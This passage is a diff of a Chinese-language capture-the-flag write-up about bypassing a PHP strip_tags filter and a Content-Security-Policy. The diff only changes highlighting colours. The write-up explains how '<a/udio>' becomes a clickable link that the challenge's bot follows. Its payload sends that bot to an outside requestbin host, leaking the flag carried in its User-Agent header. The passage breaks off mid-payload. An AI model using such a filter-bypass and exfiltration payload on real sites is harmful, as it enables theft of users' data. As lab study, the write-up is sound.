@@ -345,69 +345,69 @@
 <p>CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。</p>
 <p><em>CSP</em>的实质就是白名单策略，预先设定好哪些资源能被加载执行而哪些不能。</p>
 <p>flag在worker/worker.js</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// (snipped)
-</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">const</span> <span style="color:#000">flag</span> = <span style="color:#5a2">&#39;zer0pts{&lt;censored&gt;}&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">// (snipped)
+</span></span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">const</span> <span style="color:#268bd2">flag</span> = <span style="color:#2aa198">&#39;zer0pts{&lt;censored&gt;}&#39;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">// (snipped)
-</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">const</span> <span style="color:#000">crawl</span> = <span style="color:#00f">async</span> (<span style="color:#000">url</span>) =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Query! (</span><span style="color:#5a2">${</span><span style="color:#000">url</span><span style="color:#5a2">}</span><span style="color:#5a2">)`</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">const</span> <span style="color:#000">page</span> = <span style="color:#00f">await</span> <span style="color:#000">browser</span>.<span style="color:#000">newPage</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">try</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">page</span>.<span style="color:#000">setUserAgent</span>(<span style="color:#000">flag</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">page</span>.<span style="color:#00f">goto</span>(<span style="color:#000">url</span>, {
-</span></span><span style="display:flex;"><span>            <span style="color:#000">waitUntil</span>: <span style="color:#5a2">&#39;networkidle0&#39;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#000">timeout</span>: <span style="color:#3af">10</span> * <span style="color:#3af">1000</span>,
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">// (snipped)
+</span></span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">const</span> <span style="color:#268bd2">crawl</span> = <span style="color:#859900">async</span> (<span style="color:#268bd2">url</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#2aa198">`[+] Query! (</span><span style="color:#2aa198">${</span><span style="color:#268bd2">url</span><span style="color:#2aa198">}</span><span style="color:#2aa198">)`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#859900">const</span> <span style="color:#268bd2">page</span> = <span style="color:#859900">await</span> <span style="color:#268bd2">browser</span>.<span style="color:#268bd2">newPage</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#859900">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">await</span> <span style="color:#268bd2">page</span>.<span style="color:#268bd2">setUserAgent</span>(<span style="color:#268bd2">flag</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">await</span> <span style="color:#268bd2">page</span>.<span style="color:#859900">goto</span>(<span style="color:#268bd2">url</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#268bd2">waitUntil</span>: <span style="color:#2aa198">&#39;networkidle0&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#268bd2">timeout</span>: <span style="color:#2aa198;font-weight:bold">10</span> * <span style="color:#2aa198;font-weight:bold">1000</span>,
 </span></span><span style="display:flex;"><span>        });
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">page</span>.<span style="color:#000">click</span>(<span style="color:#5a2">&#39;#like&#39;</span>);
-</span></span><span style="display:flex;"><span>    } <span style="color:#00f">catch</span> (<span style="color:#000">err</span>){
-</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#000">err</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">await</span> <span style="color:#268bd2">page</span>.<span style="color:#268bd2">click</span>(<span style="color:#2aa198">&#39;#like&#39;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#859900">catch</span> (<span style="color:#268bd2">err</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#268bd2">err</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">await</span> <span style="color:#000">page</span>.<span style="color:#000">close</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Done! (</span><span style="color:#5a2">${</span><span style="color:#000">url</span><span style="color:#5a2">}</span><span style="color:#5a2">)`</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#859900">await</span> <span style="color:#268bd2">page</span>.<span style="color:#268bd2">close</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">console</span>.<span style="color:#268bd2">log</span>(<span style="color:#2aa198">`[+] Done! (</span><span style="color:#2aa198">${</span><span style="color:#268bd2">url</span><span style="color:#2aa198">}</span><span style="color:#2aa198">)`</span>)
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">// (snipped)
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">// (snipped)
 </span></span></span></code></pre></div><p>“如果爬虫访问您拥有的网站，就可以从UA头里获得flag”</p>
 <p>这里的意思是会自动点击like，埋下伏笔</p>
 <p><strong>util.php</strong> 中</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// [[URL]] → &lt;audio src=&#34;URL&#34;&gt;&lt;/audio&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">function</span> <span style="color:#000">render_tags</span>(<span style="color:#000">$str</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">// [[URL]] → &lt;audio src=&#34;URL&#34;&gt;&lt;/audio&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic"></span><span style="color:#859900">function</span> <span style="color:#268bd2">render_tags</span>(<span style="color:#268bd2">$str</span>) {
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>  <span style="color:#000">$str</span> = <span style="color:#000">preg_replace</span>(<span style="color:#5a2">&#39;/[[(.+?)]]/&#39;</span>, <span style="color:#5a2">&#39;&lt;audio controls src=&#34;\1&#34;&gt;&lt;/audio&gt;&#39;</span>, <span style="color:#000">$str</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#000">$str</span> = <span style="color:#000">strip_tags</span>(<span style="color:#000">$str</span>, <span style="color:#5a2">&#39;&lt;audio&gt;&#39;</span>); <span style="color:#888;font-style:italic">// only allows `&lt;audio&gt;`
-</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>  <span style="color:#00f">return</span> <span style="color:#000">$str</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#268bd2">$str</span> = <span style="color:#268bd2">preg_replace</span>(<span style="color:#2aa198">&#39;/[[(.+?)]]/&#39;</span>, <span style="color:#2aa198">&#39;&lt;audio controls src=&#34;\1&#34;&gt;&lt;/audio&gt;&#39;</span>, <span style="color:#268bd2">$str</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#268bd2">$str</span> = <span style="color:#268bd2">strip_tags</span>(<span style="color:#268bd2">$str</span>, <span style="color:#2aa198">&#39;&lt;audio&gt;&#39;</span>); <span style="color:#93a1a1;font-style:italic">// only allows `&lt;audio&gt;`
+</span></span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic"></span>  <span style="color:#859900">return</span> <span style="color:#268bd2">$str</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>audio为白标签</p>
 <p>而audio受以下CSP的限制，无法跨域请求：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#000">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">error_reporting</span>(<span style="color:#3af">0</span>);
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#268bd2">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">error_reporting</span>(<span style="color:#2aa198;font-weight:bold">0</span>);
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#00f">require_once</span> <span style="color:#5a2">&#39;config.php&#39;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#00f">require_once</span> <span style="color:#5a2">&#39;util.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#859900">require_once</span> <span style="color:#2aa198">&#39;config.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#859900">require_once</span> <span style="color:#2aa198">&#39;util.php&#39;</span>;
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#000">$nonce</span> = <span style="color:#000">get_nonce</span>();
-</span></span><span style="display:flex;"><span><span style="color:#000">header</span>(<span style="color:#5a2">&#34;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-</span><span style="color:#5a2">${</span><span style="color:#000">nonce</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">header</span>(<span style="color:#5a2">&#39;X-Frame-Options: DENY&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">header</span>(<span style="color:#5a2">&#39;X-XSS-Protection: 1; mode=block&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$nonce</span> = <span style="color:#268bd2">get_nonce</span>();
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">header</span>(<span style="color:#2aa198">&#34;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-</span><span style="color:#2aa198">${</span><span style="color:#268bd2">nonce</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">header</span>(<span style="color:#2aa198">&#39;X-Frame-Options: DENY&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">header</span>(<span style="color:#2aa198">&#39;X-XSS-Protection: 1; mode=block&#39;</span>);
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#000">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">session_start</span>();
 </span></span></code></pre></div><p>继续深入，strip_tags函数</p>
 <p>从<code>Dockerfile</code>中可以看出Web 服务器使用 PHP 7.4.0</p>
 <p>strip_tags函数在7.4.0之前允许标签里出现斜线</p>
 <p>（应该是为了让<code>&lt;/audio&gt;</code>可以通过）</p>
 <p>但是<code>&lt;a/udio&gt;</code>在浏览器里会解析成<code>&lt;a&gt;</code>标签，而超链接的跳转不受CSP的限制。</p>
 <p>浏览器解析后就成了</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;a udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&gt;aa
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;a udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&gt;aa
 </span></span></code></pre></div><p>需要开个内网</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://http.requestbin.buuoj.cn/1illhcn1
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://http.requestbin.buuoj.cn/1illhcn1
 </span></span></code></pre></div><p>我们输入的内容是在第一个点赞按钮的上面，id为like，照应点击伏笔。</p>
 <p>payload</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&gt;aa
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1&gt;aa
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>或
 </span></span><span style="display:flex;"><span>
